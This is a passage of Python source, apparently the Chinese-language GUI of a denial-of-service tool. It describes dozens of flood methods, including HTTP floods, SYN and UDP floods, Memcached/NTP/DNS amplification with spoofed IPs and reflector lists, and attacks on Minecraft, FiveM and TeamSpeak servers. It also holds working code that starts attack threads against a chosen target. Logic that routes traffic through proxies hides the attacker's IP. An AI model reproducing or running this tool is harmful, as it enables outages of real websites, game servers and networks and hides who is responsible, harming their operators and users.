警告: 仅对未打补丁的Apache有效
建议: 谨慎使用""",
            
            "XMLRPC": """原理: 攻击WordPress的XMLRPC接口
特点: 使用pingback.ping方法
适用: 启用了XMLRPC的WordPress站点
优势: 可以利用WordPress的放大效应
建议: 专门针对WordPress站点""",
            
            "BOT": """原理: 模拟搜索引擎爬虫
特点: 使用Google、Bing等爬虫User-Agent
适用: 信任搜索引擎的网站
优势: 可能绕过基础的爬虫检测
建议: 适用于信任爬虫的网站""",
            
            "DOWNLOADER": """原理: 缓慢读取下载内容
特点: 保持连接打开，缓慢接收数据
适用: 有下载服务的服务器
优势: 占用连接和带宽
建议: 适用于有下载功能的服务器""",
            
            "KILLER": """原理: 使用极多线程快速攻击
特点: 每个线程再启动多个子线程
适用: 需要极高并发的情况
警告: 资源消耗极大，可能导致系统崩溃
建议: 谨慎使用，可能导致系统不稳定""",
            
            "TOR": """原理: 通过Tor2Web网关访问.onion站点
特点: 支持Tor隐藏服务攻击
适用: .onion域名站点
优势: 可以攻击Tor网络中的服务
建议: 专门用于.onion站点""",
            
            "BOMB": """原理: 使用bombardier工具进行HTTP/2攻击
特点: 需要安装bombardier外部工具
适用: 支持HTTP/2的服务器
优势: HTTP/2多路复用，效率更高
要求: 需要代理，需要安装bombardier
建议: 需要预先安装bombardier工具""",
            
            # Layer 4 TCP/UDP洪水
            "TCP": """原理: 建立大量TCP连接并发送随机数据
特点: 消耗目标连接数和带宽
适用: 任何TCP服务（HTTP、HTTPS、SSH等）
优势: 通用性强，有效果
资源消耗: 高带宽，高连接数
建议: Layer 4 攻击的首选方法""",
            
            "UDP": """原理: 发送大量UDP数据包
特点: 无连接，快速发送
适用: DNS、游戏服务器等UDP服务
优势: 无需建立连接，速度快
资源消耗: 高带宽
建议: 适用于UDP服务""",
            
            "OVH-UDP": """原理: UDP洪水配合随机HTTP头，绕过OVH防护
特点: 专门针对OVH的UDP防护
适用: OVH托管的UDP服务
优势: 绕过OVH的UDP过滤
建议: 适用于OVH托管的UDP服务""",
            
            "SYN": """原理: SYN洪水攻击，发送大量SYN包不完成握手
特点: 占用目标连接队列
适用: TCP服务
优势: 低带宽，高连接占用
要求: ⚠️ 需要原始套接字权限（管理员/root）
资源消耗: 低带宽，高连接数
建议: 需要管理员权限，适用于TCP服务""",
            
            "ICMP": """原理: ICMP洪水（Ping洪水）
特点: 网络层攻击
适用: 任何网络主机
优势: 绕过应用层防护
要求: ⚠️ 需要原始套接字权限（管理员/root）
资源消耗: 中等带宽
建议: 需要管理员权限，适用于网络层攻击""",
            
            # Layer 4 放大攻击
            "DNS": """原理: DNS放大攻击 - 伪造源IP向DNS服务器查询
特点: 导致DNS服务器向目标发送大量响应
放大倍数: 10-50倍
适用: 有开放DNS反射器的环境
要求: ⚠️ 
  • 需要反射器文件（开放DNS服务器IP列表）
  • 需要原始套接字权限
  • 需要IP欺骗能力
警告: ⚠️ 这是放大攻击，需要特殊网络环境，仅用于授权的渗透测试
建议: 需要特殊环境，谨慎使用""",
            
            "NTP": """原理: NTP放大攻击 - 利用NTP的monlist功能
特点: 放大倍数极高
放大倍数: 200-1000倍
适用: 有开放NTP服务器的环境
要求: ⚠️ 同DNS放大攻击要求
警告: ⚠️ 放大倍数极高，谨慎使用
建议: 需要特殊环境，谨慎使用""",
            
            "MEM": """原理: Memcached放大攻击 - 利用未保护的Memcached服务器
特点: 放大倍数极高
放大倍数: 10,000-50,000倍
适用: 有开放Memcached服务器的环境
要求: ⚠️ 同DNS放大攻击要求
警告: ⚠️ 放大倍数极高，需要严格控制
建议: 需要特殊环境，极端谨慎使用""",
            
            "RDP": """原理: RDP放大攻击 - 利用RDP协议
特点: 中等放大倍数
放大倍数: 中等
适用: 有开放RDP服务的环境
要求: ⚠️ 同DNS放大攻击要求
建议: 需要特殊环境，谨慎使用""",
            
            "CHAR": """原理: Chargen放大攻击 - 利用Chargen服务
特点: 中等放大倍数
放大倍数: 中等
适用: 有开放Chargen服务的环境
要求: ⚠️ 同DNS放大攻击要求
建议: 需要特殊环境，谨慎使用""",
            
            "CLDAP": """原理: CLDAP放大攻击 - 利用CLDAP协议
特点: 较高的放大倍数
放大倍数: 50-70倍
适用: 有开放CLDAP服务的环境
要求: ⚠️ 同DNS放大攻击要求
建议: 需要特殊环境，谨慎使用""",
            
            "ARD": """原理: Apple Remote Desktop放大攻击
特点: 中等放大倍数
放大倍数: 中等
适用: 有ARD服务的环境
要求: ⚠️ 同DNS放大攻击要求
建议: 需要特殊环境，谨慎使用""",
            
            # Layer 4 游戏协议
            "MINECRAFT": """原理: Minecraft服务器状态查询洪水
特点: 针对Minecraft服务器协议
适用: Minecraft游戏服务器
优势: 专门针对Minecraft协议
建议: 专门用于Minecraft服务器""",
            
            "MCBOT": """原理: 模拟Minecraft机器人登录和操作
特点: 需要协议版本，消耗服务器更多资源
适用: Minecraft游戏服务器
优势: 更真实的攻击，消耗更多服务器资源
建议: 专门用于Minecraft服务器，需要协议版本""",
            
            "MCPE": """原理: Minecraft Pocket Edition协议攻击
特点: 针对移动版Minecraft协议
适用: Minecraft PE服务器
建议: 专门用于Minecraft PE服务器""",
            
            "FIVEM": """原理: FiveM服务器状态查询洪水
特点: 针对FiveM游戏服务器
适用: FiveM游戏服务器
建议: 专门用于FiveM游戏服务器""",
            
            "FIVEM-TOKEN": """原理: FiveM令牌确认洪水
特点: 发送大量令牌确认请求
适用: FiveM游戏服务器
建议: 专门用于FiveM游戏服务器""",
            
            "TS3": """原理: TeamSpeak 3服务器状态查询洪水
特点: 针对TS3语音服务器
适用: TeamSpeak 3服务器
建议: 专门用于TeamSpeak 3服务器""",
            
            "VSE": """原理: Source引擎游戏服务器查询洪水
特点: 针对Valve Source引擎游戏
适用: CS:GO、TF2等Source引擎游戏服务器
建议: 专门用于Source引擎游戏服务器""",
            
            # Layer 4 连接攻击
            "CPS": """原理: 快速建立和关闭连接
特点: 通过代理快速建立连接
适用: 需要连接管理的服务器
优势: 占用连接资源
要求: ⚠️ 需要代理
建议: 需要配置代理列表""",
            
            "CONNECTION": """原理: 建立连接并保持存活
特点: 占用连接池
适用: 有限连接数的服务器
优势: 长时间占用连接
要求: ⚠️ 需要代理
建议: 需要配置代理列表""",
        }

    def show_method_info(self):
        """显示方法详细信息对话框"""
        method = self.method_var.get()
        if not method:
            messagebox.showinfo("提示", "请先选择攻击方法")
            return
        
        descriptions = self._get_method_descriptions()
        desc = descriptions.get(method, "未找到该方法的详细说明")
        
        # 创建详细信息窗口
        info_window = tk.Toplevel(self.root)
        info_window.title(f"攻击方法说明 - {method}")
        info_window.geometry("600x400")
        info_window.resizable(True, True)
        
        # 标题
        title_label = ttk.Label(
            info_window, text=f"方法: {method}", 
            font=("Arial", 14, "bold")
        )
        title_label.pack(pady=10)
        
        # 说明文本
        desc_text = scrolledtext.ScrolledText(
            info_window, wrap=tk.WORD, font=("Arial", 10),
            padx=10, pady=10
        )
        desc_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        desc_text.insert(1.0, desc)
        desc_text.config(state=tk.DISABLED)
        
        # 关闭按钮
        ttk.Button(
            info_window, text="关闭", command=info_window.destroy
        ).pack(pady=10)

    def browse_proxy_file(self):
        """浏览代理文件"""
        filename = filedialog.askopenfilename(
            title="选择代理文件",
            initialdir=str(__dir__ / "files" / "proxies"),
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            self.proxy_file_var.set(Path(filename).name)

    def browse_reflector_file(self):
        """浏览反射器文件"""
        filename = filedialog.askopenfilename(
            title="选择反射器文件",
            initialdir=str(__dir__ / "files"),
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            self.reflector_file_var.set(Path(filename).name)

    def log(self, message: str, level: str = "INFO"):
        """添加日志"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}\n"

        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, log_message, level)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

        # 更新状态栏
        self.status_bar.config(text=f"{timestamp} - {message}")

    def start_attack(self):
        """开始攻击"""
        if self.is_attacking:
            messagebox.showwarning("警告", "攻击正在进行中")
            return

        # 验证输入
        method = self.method_var.get()
        if not method:
            messagebox.showerror("错误", "请选择攻击方法")
            return

        target = self.target_var.get().strip()
        if not target:
            messagebox.showerror("错误", "请输入目标地址")
            return

        try:
            threads = int(self.threads_var.get())
            duration = int(self.duration_var.get())
        except ValueError:
            messagebox.showerror("错误", "线程数和持续时间必须是数字")
            return

        # 解析代理类型
        proxy_type_str = self.proxy_type_var.get().split("=")[0]
        try:
            proxy_type = int(proxy_type_str)
        except ValueError:
            proxy_type = 0
        
        # 如果选择的是"0=不使用代理"，确保proxy_type为0
        if "不使用代理" in self.proxy_type_var.get():
            proxy_type = 0

        # 启动攻击线程
        self.attack_event = Event()
        self.attack_event.clear()
        self.duration = duration
        self.is_attacking = True
        self.start_time = time()
        
        # 初始化统计变量
        self._total_requests = 0
        self._total_bytes = 0
        self._zero_stats_warned = False  # 重置警告标志
        
        # 重置统计显示
        self.stats_labels["pps_stats"].config(text="0")
        self.stats_labels["bps_stats"].config(text="0 B")
        self.stats_labels["total_requests"].config(text="0")
        self.stats_labels["total_bytes"].config(text="0 B")
        self.stats_labels["proxy_usage"].config(text="未使用", foreground="gray")
        
        # 重置代理状态
        self.status_labels["proxy_status"].config(text="-", foreground="gray")
        self.status_labels["proxy_count"].config(text="-", foreground="gray")
        
        # 重置代理性能统计
        self.proxy_stats_labels["proxy_type_display"].config(text="-", foreground="gray")
        self.proxy_stats_labels["proxy_file_display"].config(text="-", foreground="gray")
        self.proxy_stats_labels["proxy_avg_load"].config(text="-", foreground="gray")
        self.proxy_stats_labels["proxy_estimated_bw"].config(text="-", foreground="gray")

        attack_thread = threading.Thread(
            target=self._execute_attack,
            args=(method, target, threads, duration, proxy_type),
            daemon=True
        )
        attack_thread.start()

        # 启动监控线程
        self.monitor_thread = threading.Thread(
            target=self._monitor_attack,
            daemon=True
        )
        self.monitor_thread.start()

        # 更新UI
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.status_labels["attack_status"].config(text="运行中", foreground="green")
        self.status_labels["target_status"].config(text=target)
        self.status_labels["method_status"].config(text=method)

        self.log(f"开始攻击: {method} -> {target} (线程数: {threads}, 持续时间: {duration}秒)")

    def _execute_attack(self, method: str, target: str, threads: int, duration: int, proxy_type: int):
        """执行攻击（在后台线程中运行）"""
        try:
            # 构建命令参数
            if method in Methods.LAYER7_METHODS:
                # Layer7攻击
                urlraw = target
                if not urlraw.startswith("http"):
                    urlraw = "http://" + urlraw

                try:
                    rpc = int(self.rpc_var.get())
                except:
                    rpc = 1

                proxy_file = self.proxy_file_var.get()
                proxy_li = __dir__ / "files" / "proxies" / proxy_file

                # 处理代理
                url = URL(urlraw)
                try:
                    # 检查代理文件是否存在，如果不存在且需要代理，先尝试快速处理
                    if not proxy_li.exists() and proxy_type > 0:
                        self.log(f"代理文件不存在，尝试快速加载...", "WARNING")
                        # 使用较短的超时和更少的线程来加快速度
                        try:
                            from start import ProxyManager, ProxyChecker, ProxyType, ProxyUtiles
                            from concurrent.futures import ThreadPoolExecutor, as_completed
                            
                            # 快速下载（限制源数量）
                            providrs = [
                                provider for provider in con["proxy-providers"]
                                if provider["type"] == proxy_type or proxy_type == 0
                            ][:5]  # 只使用前5个源加快速度
                            
                            self.log(f"从 {len(providrs)} 个源快速下载代理...", "INFO")
                            proxies_set = set()
                            
                            with ThreadPoolExecutor(max_workers=5) as executor:
                                future_to_download = {
                                    executor.submit(
                                        self._quick_download_proxy,
                                        provider,
                                        ProxyType.stringToProxyType(str(provider["type"]))
                                    )
                                    for provider in providrs
                                }
                                for future in as_completed(future_to_download, timeout=30):
                                    try:
                                        for pro in future.result():
                                            proxies_set.add(pro)
                                    except Exception:
                                        pass
                            
                            if proxies_set:
                                self.log(f"快速下载了 {len(proxies_set)} 个代理，跳过验证以加快速度", "WARNING")
                                # 保存但不验证（加快速度）
                                proxy_li.parent.mkdir(parents=True, exist_ok=True)
                                with proxy_li.open("w") as f:
                                    for proxy in list(proxies_set)[:1000]:  # 限制数量
                                        f.write(str(proxy) + "\n")
                            else:
                                self.log("快速下载失败，将不使用代理", "WARNING")
                                proxies = None
                                proxy_li = None  # 标记不使用代理文件
                        except Exception as e:
                            self.log(f"快速下载代理失败: {e}，将不使用代理", "WARNING")
                            proxies = None
                            proxy_li = None
                    
                    # 如果proxy_type为0，不使用代理
                    if proxy_type == 0:
                        proxies = None
                        proxy_count = 0
                        self.log("已选择不使用代理，将直接连接目标", "INFO")
                    elif proxy_li and proxy_li.exists():
                        # 确保proxy_type > 0才加载代理
                        if proxy_type > 0:
                            proxies = handleProxyList(con, proxy_li, proxy_type, url)
                        else:
                            proxies = None
                            proxy_count = 0
                            self.log("已选择不使用代理，将直接连接目标", "INFO")
                        
                        if proxies:
                            # 按类型过滤代理（如果指定了类型）
                            if proxy_type > 0:
                                from PyRoxy import ProxyType
                                type_map = {
                                    1: ProxyType.HTTP,
                                    4: ProxyType.SOCKS4,
                                    5: ProxyType.SOCKS5
                                }
                                if proxy_type in type_map:
                                    target_type = type_map[proxy_type]
                                    original_count = len(proxies)
                                    filtered_proxies = set()
                                    for proxy in proxies:
                                        if proxy.type == target_type:
                                            filtered_proxies.add(proxy)
                                    
                                    if filtered_proxies:
                                        proxies = filtered_proxies
                                        proxy_count = len(proxies)
                                        type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "未知")
                                        if original_count != proxy_count:
                                            self.log(f"从 {original_count:,} 个代理中筛选出 {proxy_count:,} 个 {type_name} 代理", "INFO")
                                        else:
                                            self.log(f"成功加载 {proxy_count:,} 个 {type_name} 代理", "INFO")
                                    else:
                                        # 统计代理类型分布
                                        type_count = {}
                                        for proxy in proxies:
                                            proxy_type_name = proxy.type.name if hasattr(proxy.type, 'name') else "Unknown"
                                            type_count[proxy_type_name] = type_count.get(proxy_type_name, 0) + 1
                                        type_info = ", ".join([f"{k}: {v}" for k, v in type_count.items()])
                                        type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "未知")
                                        self.log(f"⚠️ 警告: 代理文件中没有 {type_name} 类型的代理", "WARNING")
                                        self.log(f"当前代理类型分布: {type_info}", "INFO")
                                        self.log("建议: 1) 重新下载指定类型的代理  2) 使用'0=全部'类型", "WARNING")
                                        proxies = None
                                        proxy_count = 0
                                else:
                                    proxy_count = len(proxies)
                                    self.log(f"成功加载 {proxy_count:,} 个代理", "INFO")
                            else:
                                proxy_count = len(proxies)
                                self.log(f"成功加载 {proxy_count:,} 个代理", "INFO")
                        else:
                            proxy_count = 0
                            self.log("代理文件为空或加载失败", "WARNING")
                    else:
                        proxies = None
                        proxy_count = 0
                except Exception as e:
                    self.log(f"处理代理失败: {e}，将不使用代理", "WARNING")
                    proxies = None
                    proxy_count = 0
                
                # 保存代理信息用于显示
                self.proxy_info = {
                    "using": proxies is not None and proxy_count > 0,
                    "count": proxy_count if proxies else 0,
                    "type": proxy_type,
                    "file": proxy_file if proxy_type > 0 else None,
                    "method_support": True  # Layer7方法都支持代理
                }
                
                # 更新代理状态显示
                if self.proxy_info["using"]:
                    proxy_type_name = {0: "全部", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5", 6: "随机"}.get(proxy_type, "未知")
                    self.root.after(0, lambda: self.status_labels["proxy_status"].config(
                        text="✅ 使用中", foreground="green"
                    ))
                    self.root.after(0, lambda c=proxy_count: self.status_labels["proxy_count"].config(
                        text=f"{c:,} 个代理", foreground="green"
                    ))
                    # 更新代理性能统计
                    self.root.after(0, lambda t=proxy_type_name: self.proxy_stats_labels["proxy_type_display"].config(
                        text=t, foreground="blue"
                    ))
                    self.root.after(0, lambda f=proxy_file: self.proxy_stats_labels["proxy_file_display"].config(
                        text=f, foreground="blue"
                    ))
                else:
                    reason = "未配置" if proxy_type == 0 else "文件不存在或为空"
                    self.root.after(0, lambda r=reason: self.status_labels["proxy_status"].config(
                        text=f"❌ {r}", foreground="red"
                    ))
                    self.root.after(0, lambda: self.status_labels["proxy_count"].config(
                        text="0 个代理", foreground="gray"
                    ))
                    # 清空代理性能统计
                    self.root.after(0, lambda: self.proxy_stats_labels["proxy_type_display"].config(
                        text="-", foreground="gray"
                    ))
                    self.root.after(0, lambda: self.proxy_stats_labels["proxy_file_display"].config(
                        text="-", foreground="gray"
                    ))

                # 加载UserAgent和Referer
                useragent_li = __dir__ / "files" / "useragent.txt"
                referers_li = __dir__ / "files" / "referers.txt"

                if not useragent_li.exists():
                    self.log("UserAgent文件不存在", "ERROR")
                    return
                if not referers_li.exists():
                    self.log("Referer文件不存在", "ERROR")
                    return

                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())

                if not uagents:
                    self.log("UserAgent文件为空", "ERROR")
                    return
                if not referers:
                    self.log("Referer文件为空", "ERROR")
                    return

                host = url.host
                if method != "TOR":
                    try:
                        host = gethostbyname(url.host)
                    except Exception as e:
                        self.log(f"无法解析主机名: {e}", "ERROR")
                        return

                # 验证代理是否真的可用（如果配置了代理）
                if proxies and len(proxies) > 0:
                    self.log(f"验证代理连接性（测试前5个代理）...", "INFO")
                    test_success = 0
                    test_count = min(5, len(proxies))
                    from socket import AF_INET, SOCK_STREAM
                    for i, test_proxy in enumerate(list(proxies)[:test_count]):
                        try:
                            # 尝试通过代理连接测试
                            test_sock = test_proxy.open_socket(AF_INET, SOCK_STREAM)
                            test_sock.settimeout(3)
                            test_sock.connect((host, url.port or 80))
                            test_sock.close()
                            test_success += 1
                        except Exception as e:
                            self.log(f"代理 {i+1} 连接失败: {str(e)[:50]}", "DEBUG")
                    
                    if test_success == 0:
                        self.log(f"⚠️ 警告: 测试的 {test_count} 个代理都无法连接目标，代理可能已失效", "WARNING")
                        self.log("⚠️ 注意: 已启用强制代理模式，如果所有代理都失败，攻击线程将停止（不会使用本机IP）", "WARNING")
                        self.log("建议: 1) 使用'检查代理'功能验证代理  2) 重新下载代理  3) 检查代理类型是否匹配", "WARNING")
                    else:
                        self.log(f"✓ 代理验证: {test_success}/{test_count} 个代理可以连接目标", "INFO")
                        if test_success < test_count:
                            self.log(f"⚠️ 注意: {test_count - test_success} 个代理无法连接，攻击线程将自动重试其他代理", "WARNING")
                        self.log("✓ 已启用强制代理模式：本机IP仅与代理服务器通信，不会直接连接目标", "INFO")
                
                # 启动攻击线程
                # 确保proxy_type=0时，proxies为None
                if proxy_type == 0:
                    proxies = None
                    self.log("确认: 不使用代理，将直接连接目标", "INFO")
                
                self.log(f"正在启动 {threads} 个攻击线程...")
                started_threads = 0
                for thread_id in range(threads):
                    try:
                        thread = HttpFlood(
                            thread_id, url, host, method, rpc, self.attack_event,
                            uagents, referers, proxies
                        )
                        thread.start()
                        started_threads += 1
                    except Exception as e:
                        self.log(f"启动线程 {thread_id} 失败: {e}", "WARNING")
                
                self.log(f"成功启动 {started_threads}/{threads} 个攻击线程", "INFO")
                if started_threads == 0:
                    self.log("错误: 没有成功启动任何攻击线程！", "ERROR")
                    return
                
                # 等待所有线程启动
                sleep(0.5)
                
                # 诊断：检查计数器是否开始增加
                initial_requests = int(REQUESTS_SENT)
                initial_bytes = int(BYTES_SEND)
                self.log(f"诊断: 初始计数器值 - 请求: {initial_requests}, 字节: {initial_bytes}", "DEBUG")

            elif method in Methods.LAYER4_METHODS:
                # Layer4攻击
                try:
                    if ":" in target:
                        # 格式: IP:PORT
                        target_host, port_str = target.rsplit(":", 1)
                        port = int(port_str)
                    else:
                        # 只有IP或域名，使用配置的端口
                        target_host = target
                        port = int(self.port_var.get())
                except ValueError:
                    # 尝试作为URL解析
                    urlraw = target
                    if not urlraw.startswith("http"):
                        urlraw = "http://" + urlraw
                    target_url = URL(urlraw)
                    port = target_url.port or int(self.port_var.get())
                    target_host = target_url.host

                try:
                    target_ip = gethostbyname(target_host)
                except Exception as e:
                    self.log(f"无法解析主机名: {e}", "ERROR")
                    return

                if port > 65535 or port < 1:
                    self.log("无效的端口号 [1-65535]", "ERROR")
                    return

                # 检查是否需要原始套接字
                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"}:
                    if not ToolsConsole.checkRawSocket():
                        self.log("无法创建原始套接字（需要管理员权限）", "ERROR")
                        return

                proxies = None
                ref = None

                # 处理代理（部分Layer4方法支持）
                proxies = None
                proxy_count = 0
                
                # 检查方法是否支持代理
                methods_support_proxy = {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}
                methods_no_proxy = {"SYN", "ICMP", "UDP", "VSE", "TS3", "MCPE", "FIVEM", "FIVEM-TOKEN", 
                                   "OVH-UDP", "NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "AMP"}
                
                if method in methods_no_proxy:
                    # 明确不支持代理的方法
                    if proxy_type > 0:
                        self.log(f"⚠️ 警告: {method} 方法不支持代理（使用原始套接字或UDP）", "WARNING")
                        self.log("说明: 该方法直接操作IP层，无法通过代理转发", "INFO")
                        self.log("建议: 设置代理类型为 '0=不使用代理'，或使用TCP方法配合代理", "INFO")
                    proxies = None
                    proxy_count = 0
                elif proxy_type > 0:
                    # 支持代理的方法，处理代理
                    proxy_file = self.proxy_file_var.get()
                    proxy_li = __dir__ / "files" / "proxies" / proxy_file
                    
                    # 检查代理文件是否存在
                    if not proxy_li.exists():
                        self.log(f"代理文件不存在，将不使用代理", "WARNING")
                        proxies = None
                        proxy_count = 0
                    else:
                        try:
                            # 确保proxy_type > 0才加载代理
                            if proxy_type == 0:
                                proxies = None
                                proxy_count = 0
                                self.log("已选择不使用代理，将直接连接目标", "INFO")
                            else:
                                proxies = handleProxyList(con, proxy_li, proxy_type)
                            if proxies:
                                # 按类型过滤代理（如果指定了类型）
                                if proxy_type > 0:
                                    from PyRoxy import ProxyType
                                    type_map = {
                                        1: ProxyType.HTTP,
                                        4: ProxyType.SOCKS4,
                                        5: ProxyType.SOCKS5
                                    }
                                    if proxy_type in type_map:
                                        target_type = type_map[proxy_type]
                                        original_count = len(proxies)
                                        filtered_proxies = set()
                                        for proxy in proxies:
                                            if proxy.type == target_type:
                                                filtered_proxies.add(proxy)
                                        
                                        if filtered_proxies:
                                            proxies = filtered_proxies
                                            proxy_count = len(proxies)
                                            type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "未知")
                                            if original_count != proxy_count:
                                                self.log(f"从 {original_count:,} 个代理中筛选出 {proxy_count:,} 个 {type_name} 代理", "INFO")
                                            else:
                                                self.log(f"成功加载 {proxy_count:,} 个 {type_name} 代理", "INFO")
                                        else:
                                            # 统计代理类型分布
                                            type_count = {}
                                            for proxy in proxies:
                                                proxy_type_name = proxy.type.name if hasattr(proxy.type, 'name') else "Unknown"
                                                type_count[proxy_type_name] = type_count.get(proxy_type_name, 0) + 1
                                            type_info = ", ".join([f"{k}: {v}" for k, v in type_count.items()])
                                            type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "未知")
                                            self.log(f"⚠️ 警告: 代理文件中没有 {type_name} 类型的代理", "WARNING")
                                            self.log(f"当前代理类型分布: {type_info}", "INFO")
                                            self.log("建议: 1) 重新下载指定类型的代理  2) 使用'0=全部'类型", "WARNING")
                                            proxies = None
                                            proxy_count = 0
                                    else:
                                        proxy_count = len(proxies)
                                        self.log(f"成功加载 {proxy_count:,} 个代理", "INFO")
                                else:
                                    proxy_count = len(proxies)
                                    self.log(f"成功加载 {proxy_count:,} 个代理", "INFO")
                            else:
                                self.log("代理文件为空或加载失败", "WARNING")
                                proxy_count = 0
                        except Exception as e:
                            self.log(f"处理代理失败: {e}，将不使用代理", "WARNING")
                            proxies = None
                            proxy_count = 0
                else:
                    # proxy_type == 0，不使用代理
                    proxies = None
                    proxy_count = 0
                
                # 保存代理信息用于显示
                self.proxy_info = {
                    "using": proxies is not None and proxy_count > 0,
                    "count": proxy_count,
                    "type": proxy_type,
                    "file": proxy_file if proxy_type > 0 else None,
                    "method_support": method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}
                }
                
                # 更新代理状态显示
                if self.proxy_info["using"]:
                    proxy_type_name = {0: "全部", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5", 6: "随机"}.get(proxy_type, "未知")
                    self.root.after(0, lambda: self.status_labels["proxy_status"].config(
                        text="✅ 使用中", foreground="green"
                    ))
                    self.root.after(0, lambda c=proxy_count: self.status_labels["proxy_count"].config(
                        text=f"{c:,} 个代理", foreground="green"
                    ))
                    # 更新代理性能统计
                    self.root.after(0, lambda t=proxy_type_name: self.proxy_stats_labels["proxy_type_display"].config(
                        text=t, foreground="blue"
                    ))
                    self.root.after(0, lambda f=proxy_file: self.proxy_stats_labels["proxy_file_display"].config(
                        text=f, foreground="blue"
                    ))
                else:
                    reason = "未配置" if proxy_type == 0 else \
                             "方法不支持" if not self.proxy_info["method_support"] else \
                             "文件不存在或为空"
                    self.root.after(0, lambda r=reason: self.status_labels["proxy_status"].config(
                        text=f"❌ {r}", foreground="red"
                    ))
                    self.root.after(0, lambda: self.status_labels["proxy_count"].config(
                        text="0 个代理", foreground="gray"
                    ))
                    # 清空代理性能统计
                    self.root.after(0, lambda: self.proxy_stats_labels["proxy_type_display"].config(
                        text="-", foreground="gray"
                    ))
                    self.root.after(0, lambda: self.proxy_stats_labels["proxy_file_display"].config(
                        text="-", foreground="gray"
                    ))

                # 处理反射器（放大攻击）
                if method in Methods.LAYER4_AMP:
                    reflector_file = self.reflector_file_var.get()
                    if reflector_file:
                        refl_li = __dir__ / "files" / reflector_file
                        if refl_li.exists():
                            ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
                            if not ref:
                                self.log("反射器文件为空", "WARNING")
                        else:
                            self.log("反射器文件不存在", "WARNING")

                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                # 验证代理是否真的可用（如果配置了代理且方法支持）
                if proxies and len(proxies) > 0 and method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                    self.log(f"验证代理连接性（测试前5个代理）...", "INFO")
                    test_success = 0
                    test_count = min(5, len(proxies))
                    from socket import AF_INET, SOCK_STREAM
                    for i, test_proxy in enumerate(list(proxies)[:test_count]):
                        try:
                            # 尝试通过代理连接测试
                            test_sock = test_proxy.open_socket(AF_INET, SOCK_STREAM)
                            test_sock.settimeout(3)
                            test_sock.connect((target_ip, port))
                            test_sock.close()
                            test_success += 1
                        except Exception as e:
                            self.log(f"代理 {i+1} 连接失败: {str(e)[:50]}", "DEBUG")
                    
                    if test_success == 0:
                        self.log(f"⚠️ 警告: 测试的 {test_count} 个代理都无法连接目标，代理可能已失效", "WARNING")
                        self.log("⚠️ 注意: 已启用强制代理模式，如果所有代理都失败，攻击线程将停止（不会使用本机IP）", "WARNING")
                        self.log("建议: 1) 使用'检查代理'功能验证代理  2) 重新下载代理  3) 检查代理类型是否匹配", "WARNING")
                    else:
                        self.log(f"✓ 代理验证: {test_success}/{test_count} 个代理可以连接目标", "INFO")
                        if test_success < test_count:
                            self.log(f"⚠️ 注意: {test_count - test_success} 个代理无法连接，攻击线程将自动重试其他代理", "WARNING")
                        self.log("✓ 已启用强制代理模式：本机IP仅与代理服务器通信，不会直接连接目标", "INFO")
                
                # 启动攻击线程
                self.log(f"正在启动 {threads} 个攻击线程...")
                started_threads = 0
                for i in range(threads):
                    try:
                        thread = Layer4(
                            (target_ip, port), ref, method, self.attack_event,
                            proxies, protocolid
                        )
                        thread.start()
                        started_threads += 1
                    except Exception as e:
                        self.log(f"启动线程 {i} 失败: {e}", "WARNING")
                
                self.log(f"成功启动 {started_threads}/{threads} 个攻击线程", "INFO")
                if started_threads == 0:
                    self.log("错误: 没有成功启动任何攻击线程！", "ERROR")
                    return
                
                # 等待所有线程启动
                sleep(0.5)
                
                # 诊断：检查计数器是否开始增加
                initial_requests = int(REQUESTS_SENT)
                initial_bytes = int(BYTES_SEND)
                self.log(f"诊断: 初始计数器值 - 请求: {initial_requests}, 字节: {initial_bytes}", "DEBUG")
                
                # 确保proxy_type=0时，proxies为None（Layer 4）
                if proxy_type == 0:
                    proxies = None
                    self.log("确认: 不使用代理，将直接连接目标", "INFO")

            # 重置计数器（确保从0开始统计）
            REQUESTS_SENT.set(0)
            BYTES_SEND.set(0)
            
            # 设置事件开始攻击
            self.attack_event.set()
            self.log(f"攻击已启动: {method} -> {target} (线程数: {threads})")
            
            # 等待1秒后检查计数器（诊断用）
            sleep(1)
            check_requests = int(REQUESTS_SENT)
            check_bytes = int(BYTES_SEND)
            if check_requests == 0 and check_bytes == 0:
                self.log("⚠️ 警告: 攻击启动1秒后，计数器仍为0，可能的问题：", "WARNING")
                if proxy_type == 0:
                    self.log("  1. 目标无法连接", "WARNING")
                    self.log("  2. 攻击方法不支持当前配置", "WARNING")
                    self.log("  3. 网络连接问题", "WARNING")
                else:
                    self.log("  1. 代理连接全部失败（如果使用代理）", "WARNING")
                    self.log("  2. 目标无法连接", "WARNING")
                    self.log("  3. 攻击方法不支持当前配置", "WARNING")
                    self.log("  4. 网络连接问题", "WARNING")
                    if hasattr(self, 'proxy_info') and self.proxy_info.get("using"):
                        self.log(f"  提示: 使用了 {self.proxy_info.get('count', 0)} 个代理，请检查代理是否可用", "WARNING")
            else:
                self.log(f"✓ 诊断: 攻击正常，1秒内发送了 {check_requests} 个请求，{Tools.humanbytes(check_bytes)} 字节", "INFO")
